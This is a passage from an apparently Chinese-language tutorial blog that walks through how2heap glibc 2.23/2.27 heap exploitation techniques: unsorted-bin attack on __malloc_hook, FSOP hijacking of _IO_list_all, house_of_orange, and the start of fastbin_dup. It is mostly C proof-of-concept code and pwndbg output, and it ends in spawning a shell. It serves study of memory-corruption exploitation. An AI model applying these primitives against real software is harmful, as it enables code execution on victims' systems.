	uint8_t* unsorted_bin_ptr &#x3D; malloc(0x80);	
	malloc(0x30);
    
	free(unsorted_bin_ptr);

	__malloc_hook_adjust &#x3D; __malloc_hook - 0x10;
	byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 

	unsorted_bin_ptr[8] &#x3D; byte1; 
    
	unsorted_bin_ptr[9] &#x3D; byte2; 
    
	malloc(0x80); 

	long long system_addr &#x3D; (long long)dlsym(RTLD_NEXT, &quot;system&quot;);

	malloc_hook_chunk[19] &#x3D; system_addr &amp; 0xff; 

	malloc_hook_chunk[20] &#x3D; (system_addr &gt;&gt; 8) &amp; 0xff; 
	malloc_hook_chunk[21] &#x3D; (system_addr &gt;&gt; 16) &amp; 0xff;
	malloc_hook_chunk[22] &#x3D; (system_addr &gt;&gt; 24) &amp; 0xff; 
    
	puts(&quot;Pop Shell!&quot;);
	malloc((long long)shell);
		
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>在没有<code>show</code>的情况下要将<code>malloc_hook</code>改成<code>ogg</code>需要通过<code>unsorted bin</code>使得<code>main arena</code>地址进入一个申请出来的堆的<code>fd</code>位置，然后让<code>fast bin</code>里的其他堆指向这个堆，并通过修改低位来改成<code>malloc_hook</code>,再利用<code>unsorted bin attack</code>改<code>malloc_hook</code>为<code>main arena</code>，最后改<code>fast bin</code>中的堆指向的堆为<code>ogg</code>即可将<code>malloc_hook</code>改成<code>ogg</code>，宗旨就是利用堆里的地址改低位为要修改的地址，需要注意<code>2.23</code>对<code>size</code>的检查</p>
</blockquote>
<p>先创建4个堆，大小分别为<code>0x60 0x80 0x80 0x60</code>,释放第三个堆进入<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x405070
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405100
Size: 0x91
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x405190
Size: 0x70

Top chunk | PREV_INUSE
Addr: 0x405200
Size: 0x20e01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请比第三个堆小的第五个堆使得它从<code>unsorted bin</code>中切割并且<code>fd</code>中有<code>main arena</code>地址，由此得到<code>malloc_hook</code>地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x405070
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x405100
Size: 0x71

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405170
Size: 0x21
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x405190
Size: 0x70

Top chunk | PREV_INUSE
Addr: 0x405200
Size: 0x20e01

pwndbg&gt; x&#x2F;20gx 0x405100
0x405100:	0x0000000000000000	0x0000000000000071
0x405110:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8
0x405120:	0x0000000000000000	0x0000000000000000
0x405130:	0x0000000000000000	0x0000000000000000
0x405140:	0x0000000000000000	0x0000000000000000
0x405150:	0x0000000000000000	0x0000000000000000
0x405160:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前后释放第四个堆和第一个堆，在<code>fast bin</code>中有第一个堆指向第四个堆，高地址便于修改为低地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x405000 —▸ 0x405190 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第一个堆的<code>fd</code>改成第五个堆，即<code>unsorted bin</code>中切割出来的堆，而该堆指向了<code>main arena</code>,再通过相同的方式将第五个堆的<code>fd</code>改成<code>malloc_hook - 0x23</code>（绕过<code>size</code>检测）</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x405000 —▸ 0x405100 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000
0x80: 0x0
unsortedbin
all: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来进行<code>unsorted bin attack</code>，创建大小为<code>0x80</code>的第六个堆，再创建一个堆来防止该堆与<code>top chunk</code>合并，释放第六个堆并把<code>bk</code>修改低位改成<code>malloc_hook - 0x10</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xfff7a92ea0000000
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x405200 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405200
BK: 0x405200 —▸ 0x7ffff7dd1b00 (__memalign_hook) ◂— 0x0
smallbins
0x20: 0x405170 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将这个堆申请出来，此时<code>malloc_hook</code>中的值就被改成了<code>main arena</code>，因为<code>main arena</code>的地址除了低位其他与<code>system</code>相同</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; p __malloc_hook
$1 &#x3D; (void *(*)(size_t, const void *)) 0x7ffff7dd1b78 &lt;main_arena+88&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>最后通过<code>bin</code>里的堆改<code>malloc_hook</code>低位为<code>system</code>即可将<code>malloc_hook</code>改成<code>system</code></p>
<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
#define vtable_offset 0xd8 

int main(void)
&#123;
    void *ptr;
    long long *list_all_ptr;

    ptr&#x3D;malloc(0x200);

    *(long long*)((long long)ptr+mode_offset)&#x3D;0x0;
    *(long long*)((long long)ptr+writeptr_offset)&#x3D;0x1;
    *(long long*)((long long)ptr+writebase_offset)&#x3D;0x0;
    *(long long*)((long long)ptr+vtable_offset)&#x3D;((long long)ptr+0x100);

    *(long long*)((long long)ptr+0x100+24)&#x3D;0x41414141;

    list_all_ptr&#x3D;(long long *)_IO_list_all;

    list_all_ptr[0]&#x3D;ptr;

    exit(0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理是劫持<code>_IO_list_all</code>，<code>IO_FILE</code>结构体链表通过<code>_chain</code>域连接<code>stderr</code>、<code>stdout</code>、<code>stdin</code>，链表的表头是<code>_IO_list_all</code>，<code>_IO_list_all</code>和<code>vtable</code>链表中各项的偏移如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x0</span>   _flags
<span class="token number">0x8</span>   _IO_read_ptr
<span class="token number">0x10</span>  _IO_read_end
<span class="token number">0x18</span>  _IO_read_base
<span class="token number">0x20</span>  _IO_write_base
<span class="token number">0x28</span>  _IO_write_ptr
<span class="token number">0x30</span>  _IO_write_end
<span class="token number">0x38</span>  _IO_buf_base
<span class="token number">0x40</span>  _IO_buf_end
<span class="token number">0x48</span>  _IO_save_base
<span class="token number">0x50</span>  _IO_backup_base
<span class="token number">0x58</span>  _IO_save_end
<span class="token number">0x60</span>  _markers
<span class="token number">0x68</span>  _chain
<span class="token number">0x70</span>  _fileno
<span class="token number">0x74</span>  _flags2
<span class="token number">0x78</span>  _old_offset
<span class="token number">0x80</span>  _cur_column
<span class="token number">0x82</span>  _vtable_offset
<span class="token number">0x83</span>  _shortbuf
<span class="token number">0x88</span>  _lock
<span class="token number">0x90</span>  _offset
<span class="token number">0x98</span>  _codecvt
<span class="token number">0xa0</span>  _wide_data
<span class="token number">0xa8</span>  _freeres_list
<span class="token number">0xb0</span>  _freeres_buf
<span class="token number">0xb8</span>  __pad5
<span class="token number">0xc0</span>  _mode
<span class="token number">0xc4</span>  _unused2
<span class="token number">0xd8</span>  vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">0x0   __dummy
0x8   __dummy2
0x10  __finish
0x18  __overflow
0x20  __underflow
0x28  __uflow
0x30  __pbackfail
0x38  __xsputn
0x40  __xsgetn
0x48  __seekoff
0x50  __seekpos
0x58  __setbuf
0x60  __sync
0x68  __doallocate
0x70  __read
0x78  __write
0x80  __seek
0x88  __close
0x90  __stat
0x98  __showmanyc
0xa0  __imbue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_list_all-&gt;file._chain
$2 &#x3D; (struct _IO_FILE *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;
pwndbg&gt; p _IO_list_all-&gt;file._chain._chain
$3 &#x3D; (struct _IO_FILE *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;
pwndbg&gt; p _IO_list_all-&gt;file._chain._chain._chain
$4 &#x3D; (struct _IO_FILE *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>FSOP</code>利用主要是劫持<code>libc</code>中的<code>_IO_list_all</code>的<code>vtable</code>中<code>__overflow</code>函数地址，之后通过调用<code>abort/exit/main</code>来触发<code>_IO_flush_all_lockp</code>用于最终调用<code>_IO_OVERFLOW</code>刷新<code>_IO_list_all</code>链表</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">int
_IO_flush_all_lockp (int do_lock)
&#123;
  ...
  fp &#x3D; (_IO_FILE *) _IO_list_all;
  while (fp !&#x3D; NULL)
  &#123;
       ...
       if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))
               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)
           &#123;
               result &#x3D; EOF;
          &#125;
        ...
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用<code>_IO_OVERFLOW</code>还需要绕过<code>if</code>判断</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">(fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>首先创建一个堆并在堆中伪造了一个<code>_IO_list_all</code>，满足<code>if</code>中的判断，并且<code>ptr+0x100+24</code>处是<code>_IO_list_all</code>的<code>vtable</code>中的<code>__overflow</code>函数地址，最后改<code>_IO_list_all</code>为伪造的地址</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all
$19 &#x3D; &#123;
  file &#x3D; &#123;
    _flags &#x3D; 0,
    _IO_read_ptr &#x3D; 0x0,
    _IO_read_end &#x3D; 0x0,
    _IO_read_base &#x3D; 0x0,
    _IO_write_base &#x3D; 0x0,
    _IO_write_ptr &#x3D; 0x1 &lt;error: Cannot access memory at address 0x1&gt;,
    _IO_write_end &#x3D; 0x0,
    _IO_buf_base &#x3D; 0x0,
    _IO_buf_end &#x3D; 0x0,
    _IO_save_base &#x3D; 0x0,
    _IO_backup_base &#x3D; 0x0,
    _IO_save_end &#x3D; 0x0,
    _markers &#x3D; 0x0,
    _chain &#x3D; 0x0,
    _fileno &#x3D; 0,
    _flags2 &#x3D; 0,
    _old_offset &#x3D; 0,
    _cur_column &#x3D; 0,
    _vtable_offset &#x3D; 0 &#39;\000&#39;,
    _shortbuf &#x3D; &quot;&quot;,
    _lock &#x3D; 0x0,
    _offset &#x3D; 0,
    _codecvt &#x3D; 0x0,
    _wide_data &#x3D; 0x0,
    _freeres_list &#x3D; 0x0,
    _freeres_buf &#x3D; 0x0,
    __pad5 &#x3D; 0,
    _mode &#x3D; 0,
    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;
  &#125;,
  vtable &#x3D; 0x405110
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all-&gt;vtable
$18 &#x3D; &#123;
  __dummy &#x3D; 0,
  __dummy2 &#x3D; 0,
  __finish &#x3D; 0x0,
  __overflow &#x3D; 0x41414141,
  __underflow &#x3D; 0x0,
  __uflow &#x3D; 0x0,
  __pbackfail &#x3D; 0x0,
  __xsputn &#x3D; 0x0,
  __xsgetn &#x3D; 0x0,
  __seekoff &#x3D; 0x0,
  __seekpos &#x3D; 0x0,
  __setbuf &#x3D; 0x0,
  __sync &#x3D; 0x0,
  __doallocate &#x3D; 0x0,
  __read &#x3D; 0x0,
  __write &#x3D; 0x0,
  __seek &#x3D; 0x0,
  __close &#x3D; 0x0,
  __stat &#x3D; 0x0,
  __showmanyc &#x3D; 0x0,
  __imbue &#x3D; 0x0
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys&#x2F;syscall.h&gt;

int winner ( char *ptr);

int main()
&#123;
    char *p1, *p2;
    size_t io_list_all, *top;

    p1 &#x3D; malloc(0x400-16);

    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] &#x3D; 0xc01;
    
    p2 &#x3D; malloc(0x1000);
    
    io_list_all &#x3D; top[2] + 0x9a8;
    
    top[3] &#x3D; io_list_all - 0x10;

    memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);

    top[1] &#x3D; 0x61;

    FILE *fp &#x3D; (FILE *) top;

    fp-&gt;_mode &#x3D; 0; &#x2F;&#x2F; top+0xc0
    fp-&gt;_IO_write_base &#x3D; (char *) 2; &#x2F;&#x2F; top+0x20
    fp-&gt;_IO_write_ptr &#x3D; (char *) 3; &#x2F;&#x2F; top+0x28

    size_t *jump_table &#x3D; &amp;top[12]; &#x2F;&#x2F; controlled memory
    jump_table[3] &#x3D; (size_t) &amp;winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F; top+0xd8

    malloc(10);
    return 0;
&#125;

int winner(char *ptr)
&#123; 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用<code>top_chunk</code>在其他<code>bins</code>不满足的情况下可以进入<code>unsorted bin</code>的特点，但是需要满足条件</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">assert ((old_top &#x3D;&#x3D; initial_top (av) &amp;&amp; old_size &#x3D;&#x3D; 0) ||
         ((unsigned long) (old_size) &gt;&#x3D; MINSIZE &amp;&amp;
          prev_inuse (old_top) &amp;&amp;
          ((unsigned long) old_end &amp; (pagesize - 1)) &#x3D;&#x3D; 0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>伪造的<code>size</code>必须要对齐到内存页<code>0x400</code>(<code>ptr + size</code>对齐)</p>
<p><code>size</code> 要大于 <code>MINSIZE(0x10)</code></p>
<p><code>size</code> 要小于之后申请的 <code>chunk size + MINSIZE(0x10)</code></p>
<p><code>size</code> 的 <code>prev inuse</code> 位必须为 <code>1</code></p>
</blockquote>
<p>先创建一个<code>0x400</code>的堆，申请的大小是<code>0x3f0</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x401

Top chunk | PREV_INUSE
Addr: 0x405400
Size: 0x20c01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着改<code>top chunk</code>大小为<code>0xc01</code>,此时<code>top chunk</code>地址加上大小刚好可以页对齐</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x401

Top chunk | PREV_INUSE
Addr: 0x405400
Size: 0xc01

pwndbg&gt; p&#x2F;x 0x405400 + 0xc00
$1 &#x3D; 0x406000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时再创建一个<code>0x1000</code>的堆，使得<code>top chunk</code>进入<code>unsorted bin</code>,此时<code>fd</code>和<code>bk</code>中存在<code>libc</code>地址，由此可以计算出<code>_IO_list_all</code>的地址，在此过程中由于申请的堆大于<code>top chunk</code>，所以向系统申请了新的<code>top chunk</code>,地址在旧的<code>top chunk</code>之后，因此旧的<code>top chunk</code>进入了<code>unsorted bin</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x400 (with flag bits: 0x401)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405400
Size: 0xbe0 (with flag bits: 0xbe1)
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x405fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x405ff0
Size: 0x10 (with flag bits: 0x11)

Allocated chunk
Addr: 0x406000
Size: 0x00 (with flag bits: 0x00)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; x&#x2F;gx 0x7ffff7dd1b78 + 0x9a8
0x7ffff7dd2520 &lt;_IO_list_all&gt;:	0x00007ffff7dd2540<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>接下来将<code>top</code>地址赋值给<code>fp</code>后直接伪造<code>_IO_list_all</code>中的内容来满足检查，并在<code>top chunk</code>中存<code>/bin/sh</code>，改<code>__overflow</code>地址为<code>winner</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);

top[1] &#x3D; 0x61;
FILE *fp &#x3D; (FILE *) top;

fp-&gt;_mode &#x3D; 0; 
fp-&gt;_IO_write_base &#x3D; (char *) 2; 
fp-&gt;_IO_write_ptr &#x3D; (char *) 3; 

size_t *jump_table &#x3D; &amp;top[12];	&#x2F;&#x2F;取一个地址为vtable
jump_table[3] &#x3D; (size_t) &amp;winner;	&#x2F;&#x2F;__overflow在跳表中的&#96;index&#96;是3
*(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; 	&#x2F;&#x2F;在fp最后设置vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; x&#x2F;20gx 0x0000000000405400
0x405400:	0x0068732f6e69622f	0x0000000000000061
0x405410:	0x00007ffff7dd1b78	0x00007ffff7dd2510
0x405420:	0x0000000000000002	0x0000000000000003
0x405430:	0x0000000000000000	0x0000000000000000
0x405440:	0x0000000000000000	0x0000000000000000
0x405450:	0x0000000000000000	0x0000000000000000
0x405460:	0x0000000000000000	0x0000000000000000
0x405470:	0x0000000000000000	0x000000000040129b
0x405480:	0x0000000000000000	0x0000000000000000
0x405490:	0x0000000000000000	0x0000000000000000
pwndbg&gt; 
0x4054a0:	0x0000000000000000	0x0000000000000000
0x4054b0:	0x0000000000000000	0x0000000000000000
0x4054c0:	0x0000000000000000	0x0000000000000000
0x4054d0:	0x0000000000000000	0x0000000000405460<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p jump_table
$52 &#x3D; (size_t *) 0x405460<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *fp
$4 &#x3D; &#123;
  _flags &#x3D; 1852400175,
  _IO_read_ptr &#x3D; 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
  _IO_read_end &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020pB&quot;,
  _IO_read_base &#x3D; 0x7ffff7dd2510 &quot;&quot;,
  _IO_write_base &#x3D; 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
  _IO_write_ptr &#x3D; 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
  _IO_write_end &#x3D; 0x0,
  _IO_buf_base &#x3D; 0x0,
  _IO_buf_end &#x3D; 0x0,
  _IO_save_base &#x3D; 0x0,
  _IO_backup_base &#x3D; 0x0,
  _IO_save_end &#x3D; 0x0,
  _markers &#x3D; 0x0,
  _chain &#x3D; 0x0,
  _fileno &#x3D; 0,
  _flags2 &#x3D; 0,
  _old_offset &#x3D; 4199067,
  _cur_column &#x3D; 0,
  _vtable_offset &#x3D; 0 &#39;\000&#39;,
  _shortbuf &#x3D; &quot;&quot;,
  _lock &#x3D; 0x0,
  _offset &#x3D; 0,
  _codecvt &#x3D; 0x0,
  _wide_data &#x3D; 0x0,
  _freeres_list &#x3D; 0x0,
  _freeres_buf &#x3D; 0x0,
  __pad5 &#x3D; 0,
  _mode &#x3D; 0,
  _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时<code>bin</code>中是存在问题的，如果创建堆就会报错</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; bin
fastbins
empty
unsortedbin
all [corrupted]
FD: 0x405400 —▸ 0x7ffff7dd1bc8 (main_arena+168) ◂— 0x405400
BK: 0x7ffff7dd2510 ◂— 0x0
smallbins
0x60: 0x405400 —▸ 0x7ffff7dd1bc8 (main_arena+168) ◂— 0x405400
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后<code>malloc</code>来触发<code>abort</code>使得<code>_IO_list_all</code>变成我们伪造的内容</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; 
*** Error in &#96;&#x2F;home&#x2F;starrysky&#x2F;how2heap-master&#x2F;glibc_2.23&#x2F;house_of_orange&#39;: malloc(): memory corruption: 0x00007ffff7dd2520 ***
35	in ..&#x2F;sysdeps&#x2F;unix&#x2F;sysv&#x2F;linux&#x2F;libc_fatal.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">  0x7ffff7a847e0 &lt;__libc_message+704&gt;    cmp    rbx, r12
  0x7ffff7a847e3 &lt;__libc_message+707&gt;    sete   sil
  0x7ffff7a847e7 &lt;__libc_message+711&gt;    mov    edx, dword ptr [rbp - 0x84]
  0x7ffff7a847ed &lt;__libc_message+717&gt;    mov    edi, r15d
  0x7ffff7a847f0 &lt;__libc_message+720&gt;    call   backtrace_and_maps                &lt;backtrace_and_maps&gt;

► 0x7ffff7a847f5 &lt;__libc_message+725&gt;    call   abort                &lt;abort&gt;

  0x7ffff7a847fa                         nop    word ptr [rax + rax]
  0x7ffff7a84800 &lt;__libc_fatal&gt;          push   rbx
  0x7ffff7a84801 &lt;__libc_fatal+1&gt;        mov    rbx, rdi
  0x7ffff7a84804 &lt;__libc_fatal+4&gt;        nop    dword ptr [rax]
  0x7ffff7a84808 &lt;__libc_fatal+8&gt;        lea    rsi, [rip + 0x117bba]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行<code>winner</code>后成功<code>getshell</code></p>
<h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><p><code>2.27</code>和<code>2.23</code>的主要区别就是引入了<code>tcache</code>,但同时也去掉了一些检测</p>
<h3 id="fastbin-dup-double-free"><a href="#fastbin-dup-double-free" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdout, NULL);

	void *ptrs[8];
	for (int i&#x3D;0; i&lt;8; i++) &#123;
		ptrs[i] &#x3D; malloc(8);
	&#125;
	for (int i&#x3D;0; i&lt;7; i++) &#123;
		free(ptrs[i]);
	&#125;

	int *a &#x3D; calloc(1, 8);
	int *b &#x3D; calloc(1, 8);
	int *c &#x3D; calloc(1, 8);

	free(a);
	free(b);
	free(a);

	a &#x3D; calloc(1, 8);
	b &#x3D; calloc(1, 8);
